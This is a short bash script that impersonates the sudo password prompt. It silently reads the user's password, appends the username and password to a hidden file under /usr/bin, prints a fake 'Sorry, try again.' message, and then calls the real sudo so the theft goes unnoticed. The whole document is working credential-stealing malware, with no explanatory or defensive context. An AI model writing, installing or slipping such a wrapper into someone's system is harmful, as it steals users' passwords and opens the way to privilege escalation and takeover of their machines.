#! /bin/bash
read -ps "[sudo] password for $USER" 
echo "$USER:$REPLY" >> /usr/bin/.passwordsfromSS
echo -n "Sorry, try again."
sudo $@
